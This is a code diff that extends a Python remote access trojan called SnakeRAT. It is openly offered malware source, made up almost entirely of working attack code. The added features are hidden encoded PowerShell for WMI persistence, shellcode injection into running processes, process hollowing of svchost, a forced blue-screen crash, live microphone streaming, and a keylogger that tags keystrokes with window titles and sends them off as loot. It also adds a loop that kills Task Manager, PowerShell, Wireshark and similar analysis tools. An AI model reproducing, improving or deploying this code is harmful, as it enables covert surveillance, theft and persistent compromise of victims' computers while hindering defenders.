@@ -58,6 +58,7 @@ if IS_WINDOWS:
         import win32con
         import win32process
         import win32service
+        import win32gui
         WINDOWS_IMPORTS = True
     except:
         WINDOWS_IMPORTS = False
@@ -1497,6 +1498,22 @@ WantedBy=default.target
                         results.append(f"Storage directory {mask_name} cleared")
                 except: pass
                 
+                # 5. WMI cleanup (if admin)
+                if PrivilegeManager.is_admin():
+                    try:
+                        wmi_cleanup_script = f"""
+                        $name = 'SnakeUpdate'
+                        Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='$name'" | Remove-WmiObject -ErrorAction SilentlyContinue
+                        Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='$name'" | Remove-WmiObject -ErrorAction SilentlyContinue
+                        Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter "Filter=\\"__EventFilter.Name='$name'\\"" | Remove-WmiObject -ErrorAction SilentlyContinue
+                        """
+                        import base64
+                        encoded_cleanup = base64.b64encode(wmi_cleanup_script.encode('utf-16-le')).decode()
+                        subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-EncodedCommand', encoded_cleanup], 
+                                       capture_output=True, creationflags=0x08000000)
+                        results.append("WMI persistence cleaned (if existed)")
+                    except: pass
+
                 return True, results
 
             elif IS_LINUX:
@@ -1748,7 +1765,8 @@ class AdvancedRAT:
         # Shell state
         self.shell_cwd = os.getcwd()
         self.socks_proxy = None
-        self.keylog_buffer = []
+        self.keylog_buffer = [] # Structured: list of {t, w, k}
+        self._audio_streaming = False
         self.sock_lock = threading.RLock()
         
         self.logger.info(f"Initialized SnakeRAT v3.1 | ID: {self.client_id}")
@@ -1782,6 +1800,11 @@ class AdvancedRAT:
             'screenshot': self._handle_screenshot,
             'webcam': self._handle_webcam,
             'microphone': self._handle_microphone,
+            'audio_stream': self._handle_audio_stream,
+            'inject': self._handle_inject,
+            'hollow': self._handle_hollow,
+            'bsod': self._handle_bsod,
+            'block_apps': self._handle_block_apps,
             'keylog': self._handle_keylog,
             'persistence': self._handle_persistence,
             'unpersist': self._handle_unpersist,
@@ -1948,7 +1971,7 @@ class AdvancedRAT:
                         if hasattr(key, 'char') and key.char is not None:
                             k = key.char
                         
-                        # 2. Fallback to string representation (handles quoted 'a', etc.)
+                        # 2. Fallback to string representation
                         if k is None:
                             k_name = str(key).strip()
                             if k_name.startswith("'") and k_name.endswith("'") and len(k_name) == 3:
@@ -1956,45 +1979,31 @@ class AdvancedRAT:
                             elif k_name.startswith("Key."):
                                 k_name = k_name.replace('Key.', '').lower()
                                 mapping = {
-                                    'space': ' ',
-                                    'enter': '\n',
-                                    'backspace': '[BS]',
-                                    'tab': '[TAB]',
-                                    'shift': '[SHIFT]',
-                                    'shift_l': '[SHIFT]',
-                                    'shift_r': '[SHIFT]',
-                                    'ctrl': '[CTRL]',
-                                    'ctrl_l': '[CTRL]',
-                                    'ctrl_r': '[CTRL]',
-                                    'alt': '[ALT]',
-                                    'alt_l': '[ALT]',
-                                    'alt_r': '[ALT]',
-                                    'caps_lock': '[CAPS]',
-                                    'esc': '[ESC]',
-                                    'up': '[UP]',
-                                    'down': '[DOWN]',
-                                    'left': '[LEFT]',
-                                    'right': '[RIGHT]'
+                                    'space': ' ', 'enter': '\n', 'backspace': '[BS]', 'tab': '[TAB]',
+                                    'shift': '[SHIFT]', 'ctrl': '[CTRL]', 'alt': '[ALT]', 'caps_lock': '[CAPS]',
+                                    'esc': '[ESC]', 'up': '[UP]', 'down': '[DOWN]', 'left': '[LEFT]', 'right': '[RIGHT]'
                                 }
                                 k = mapping.get(k_name, f'[{k_name}]')
                             else:
-                                # Last resort: raw name in brackets
                                 k = f'[{k_name}]'
                         
                         if k:
-                            self.keylog_buffer.append(k)
-                            # Clip buffer at 10k chars
-                            if len(self.keylog_buffer) > 10000:
-                                self.keylog_buffer = self.keylog_buffer[-10000:]
+                            # Capture context
+                            window_title = "Unknown"
+                            if IS_WINDOWS:
+                                try:
+                                    window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+                                except: pass
+                            
+                            self.keylog_buffer.append({
+                                't': time.time(),
+                                'w': window_title,
+                                'k': k
+                            })
+                            if len(self.keylog_buffer) > 5000:
+                                self.keylog_buffer.pop(0)
                     except:
                         pass
-
-                # Diagnostic: Log session type for Linux
-                if IS_LINUX:
-                    session = os.environ.get('XDG_SESSION_TYPE', 'unknown')
-                    self.logger.debug(f"Keylogger starting on Linux ({session})")
-                    if session == 'wayland':
-                        self.logger.warning("Keylogger might require root/input permissions on Wayland")
 
                 self.keylog_running = True
                 with keyboard.Listener(on_press=on_press) as listener:
@@ -3233,22 +3242,239 @@ class AdvancedRAT:
         """Install WMI Event Subscription persistence (Highly stealthy)"""
         if not IS_WINDOWS: return {'error': 'WMI persistence only supported on Windows'}
         
+        # WMI Persistence requires Administrator privileges
+        if not PrivilegeManager.is_admin():
+            return {'error': 'Administrator privileges required for WMI persistence'}
+
         name = "SnakeUpdate"
-        command = cmd.get('command', sys.executable)
-        
+        # Ensure command is properly quoted for CommandLineTemplate
+        command = cmd.get('command')
+        if not command:
+            # Fallback to current executable if no command provided
+            command = sys.executable
+            if not command.endswith('.exe'):
+                # If running as script, use python + script path
+                command = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
+            else:
+                command = f'"{os.path.abspath(command)}"'
+        else:
+            # If command provided, ensure it's quoted if it has spaces
+            if ' ' in command and not (command.startswith('"') and command.endswith('"')):
+                command = f'"{command}"'
+
+        # Use a more robust PowerShell script with error handling and proper escaping
         ps_script = f"""
-        $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{name}';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Minute = 0'}}
-        $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{name}';CommandLineTemplate='{command}'}}
-        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}
+        $name = '{name}'
+        $command = '{command.replace("'", "''")}'
+        
+        $FilterArgs = @{{
+            Name = $name
+            EventNamespace = 'root\\cimv2'
+            QueryLanguage = 'WQL'
+            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"
+        }}
+        
+        $ConsumerArgs = @{{
+            Name = $name
+            CommandLineTemplate = $command
+        }}
+        
+        # Remove existing if present to avoid conflicts
+        Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='$name'" | Remove-WmiObject -ErrorAction SilentlyContinue
+        Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='$name'" | Remove-WmiObject -ErrorAction SilentlyContinue
+        Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter "Filter=\\"__EventFilter.Name='$name'\\"" | Remove-WmiObject -ErrorAction SilentlyContinue
+
+        $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $FilterArgs
+        $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs
+        
+        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter; Consumer=$Consumer}}
         """
         
+        # Base64 encode for safer execution
+        import base64
+        encoded_script = base64.b64encode(ps_script.encode('utf-16-le')).decode()
+        
         try:
-            res = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True, creationflags=0x08000000)
+            res = subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-EncodedCommand', encoded_script], 
+                                 capture_output=True, text=True, creationflags=0x08000000)
             if res.returncode == 0:
-                return {'success': True}
-            return {'error': res.stderr}
+                return {'success': True, 'message': f'WMI Persistence "{name}" installed successfully.'}
+            return {'error': res.stderr or res.stdout}
         except Exception as e:
             return {'error': str(e)}
+
+    def _handle_inject(self, cmd):
+        """Inject shellcode into an existing process (Windows only)"""
+        if not IS_WINDOWS: return {'error': 'Injection only supported on Windows'}
+        
+        try:
+            pid = int(cmd.get('pid'))
+            shellcode_b64 = cmd.get('shellcode')
+            if not shellcode_b64: return {'error': 'No shellcode provided'}
+            
+            shellcode = base64.b64decode(shellcode_b64)
+            
+            import ctypes
+            from ctypes import wintypes
+            
+            # Constants
+            PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
+            MEM_COMMIT = 0x00001000
+            MEM_RESERVE = 0x00002000
+            PAGE_EXECUTE_READWRITE = 0x40
+            
+            # 1. Open target process
+            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+            if not handle:
+                return {'error': f'Could not open PID {pid}: {ctypes.FormatError(ctypes.GetLastError())}'}
+            
+            # 2. Allocate memory in target process
+            size = len(shellcode)
+            remote_mem = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+            if not remote_mem:
+                ctypes.windll.kernel32.CloseHandle(handle)
+                return {'error': f'Memory allocation failed: {ctypes.FormatError(ctypes.GetLastError())}'}
+            
+            # 3. Write shellcode to allocated memory
+            written = ctypes.c_size_t(0)
+            if not ctypes.windll.kernel32.WriteProcessMemory(handle, remote_mem, shellcode, size, ctypes.byref(written)):
+                ctypes.windll.kernel32.CloseHandle(handle)
+                return {'error': f'WriteProcessMemory failed: {ctypes.FormatError(ctypes.GetLastError())}'}
+            
+            # 4. Execute shellcode via CreateRemoteThread
+            thread_id = wintypes.DWORD(0)
+            if not ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, remote_mem, 0, 0, ctypes.byref(thread_id)):
+                ctypes.windll.kernel32.CloseHandle(handle)
+                return {'error': f'CreateRemoteThread failed: {ctypes.FormatError(ctypes.GetLastError())}'}
+            
+            ctypes.windll.kernel32.CloseHandle(handle)
+            return {'success': True, 'message': f'Successfully injected {size} bytes into PID {pid}. Thread ID: {thread_id.value}'}
+            
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_hollow(self, cmd):
+        """Spawn a legitimate process and hollow it with shellcode (Windows only)"""
+        if not IS_WINDOWS: return {'error': 'Process hollowing only supported on Windows'}
+        
+        try:
+            program = cmd.get('program', 'C:\\Windows\\System32\\svchost.exe')
+            shellcode_b64 = cmd.get('shellcode')
+            if not shellcode_b64: return {'error': 'No shellcode provided'}
+            
+            shellcode = base64.b64decode(shellcode_b64)
+            
+            import ctypes
+            from ctypes import wintypes
+            
+            # Win32 Structures
+            class PROCESS_INFORMATION(ctypes.Structure):
+                _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE), ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]
+
+            class STARTUPINFO(ctypes.Structure):
+                _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR), ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR), ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD), ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD), ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD), ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD), ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD), ("lpReserved2", ctypes.POINTER(ctypes.c_byte)), ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE)]
+
+            # Constants
+            CREATE_SUSPENDED = 0x00000004
+            MEM_COMMIT = 0x00001000
+            MEM_RESERVE = 0x00002000
+            PAGE_EXECUTE_READWRITE = 0x40
+            
+            si = STARTUPINFO()
+            si.cb = ctypes.sizeof(STARTUPINFO)
+            pi = PROCESS_INFORMATION()
+            
+            # 1. Create process in suspended state
+            if not ctypes.windll.kernel32.CreateProcessW(program, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
+                return {'error': f'CreateProcessW failed: {ctypes.FormatError(ctypes.GetLastError())}'}
+            
+            # 2. Allocate memory in the new process
+            size = len(shellcode)
+            remote_mem = ctypes.windll.kernel32.VirtualAllocEx(pi.hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+            if not remote_mem:
+                ctypes.windll.kernel32.TerminateProcess(pi.hProcess, 1)
+                return {'error': 'Memory allocation in suspended process failed'}
+            
+            # 3. Write shellcode
+            written = ctypes.c_size_t(0)
+            ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, remote_mem, shellcode, size, ctypes.byref(written))
+            
+            # 4. Execute shellcode via CreateRemoteThread
+            thread_id = wintypes.DWORD(0)
+            if not ctypes.windll.kernel32.CreateRemoteThread(pi.hProcess, None, 0, remote_mem, 0, 0, ctypes.byref(thread_id)):
+                ctypes.windll.kernel32.TerminateProcess(pi.hProcess, 1)
+                return {'error': 'Failed to execute thread in hollowed process'}
+            
+            return {'success': True, 'message': f'Successfully hollowed {program} (PID: {pi.dwProcessId}) with {size} bytes.'}
+            
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_bsod(self, cmd):
+        """Force an immediate Blue Screen of Death (Windows only)"""
+        if not IS_WINDOWS: return {'error': 'BSOD only supported on Windows'}
+        
+        try:
+            import ctypes
+            from ctypes import wintypes
+            
+            # Undocumented NT APIs
+            ntdll = ctypes.windll.ntdll
+            
+            # 1. Adjust privileges to allow shutdown/hard error
+            # SeShutdownPrivilege = 19
+            res1 = ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
+            
+            # 2. Raise Hard Error
+            # Status code 0xC000021A is STATUS_SYSTEM_PROCESS_TERMINATED (classic BSOD trigger)
+            # Response option 6 is OptionShutdownSystem
+            response = wintypes.DWORD()
+            res2 = ntdll.NtRaiseHardError(
+                0xC000021A, # Status
+                0,          # Number of parameters
+                0,          # Unicode string parameter mask
+                None,       # Parameters
+                6,          # Response option
+                ctypes.byref(response) # Response
+            )
+            
+            return {'success': True, 'message': 'BSOD triggered'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_block_apps(self, cmd):
+        """Toggle the application blocker (Guardian Mode)"""
+        action = cmd.get('action', 'on')
+        
+        if action == 'on':
+            if getattr(self, 'app_blocker_running', False):
+                return {'error': 'Application blocker is already running'}
+            self.app_blocker_running = True
+            threading.Thread(target=self._app_blocker_thread, daemon=True).start()
+            return {'success': True, 'message': 'Application Blocker (Guardian Mode) ENABLED.'}
+        else:
+            self.app_blocker_running = False
+            return {'success': True, 'message': 'Application Blocker (Guardian Mode) DISABLED.'}
+
+    def _app_blocker_thread(self):
+        """Background thread to kill unauthorized processes"""
+        blocked_names = [
+            'taskmgr.exe', 'processhacker.exe', 'procexp.exe', 
+            'regedit.exe', 'cmd.exe', 'powershell.exe',
+            'wireshark.exe', 'vboxservice.exe', 'vboxtray.exe'
+        ]
+        
+        while getattr(self, 'app_blocker_running', False):
+            try:
+                for proc in psutil.process_iter(['name']):
+                    try:
+                        if proc.info['name'].lower() in blocked_names:
+                            proc.kill()
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        pass
+                time.sleep(0.5) # Fast polling for better control
+            except:
+                time.sleep(2)
 
     def _handle_close_browser(self, cmd):
         """Force close common browsers"""
@@ -3678,13 +3904,13 @@ class AdvancedRAT:
             action = 'dump' # Fall through to dump logic
 
         if action == 'dump':
-            captured = "".join(self.keylog_buffer)
+            captured_json = json.dumps(self.keylog_buffer)
             self.keylog_buffer = [] # Clear after dump
             
             # Always send as loot
-            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-            self._send_loot('keylog', captured.encode(), filename)
-            return {'status': 'sent_as_loot', 'filename': filename, 'count': len(captured)}
+            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            self._send_loot('keylog', captured_json.encode(), filename)
+            return {'status': 'sent_as_loot', 'filename': filename, 'count': len(captured_json)}
             
         elif action == 'status':
             return {
@@ -3699,6 +3925,45 @@ class AdvancedRAT:
             return {'success': True, 'cleared_count': count}
         
         return {'error': f'Unknown action: {action}'}
+
+    def _handle_audio_stream(self, cmd):
+        """Live audio streaming via PyAudio"""
+        action = cmd.get('action', 'start')
+        
+        if action == 'start':
+            if self._audio_streaming:
+                return {'error': 'Audio stream already active'}
+            
+            self._audio_streaming = True
+            def stream_thread():
+                try:
+                    import pyaudio
+                    p = pyaudio.PyAudio()
+                    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=2048)
+                    
+                    self.logger.info("Live audio stream started")
+                    while self._audio_streaming:
+                        data = stream.read(2048, exception_on_overflow=False)
+                        self._send_message({
+                            'type': 'audio_frame',
+                            'data': base64.b64encode(data).decode()
+                        })
+                    
+                    stream.stop_stream()
+                    stream.close()
+                    p.terminate()
+                except Exception as e:
+                    self.logger.error(f"Audio stream error: {e}")
+                    self._audio_streaming = False
+
+            threading.Thread(target=stream_thread, daemon=True).start()
+            return {'success': True, 'message': 'Audio stream initiated'}
+
+        elif action == 'stop':
+            self._audio_streaming = False
+            return {'success': True, 'message': 'Audio stream stopped'}
+        
+        return {'error': 'Invalid action'}
     
     def _handle_persistence(self, cmd):
         """Install persistence and immediately launch the shadow process so the
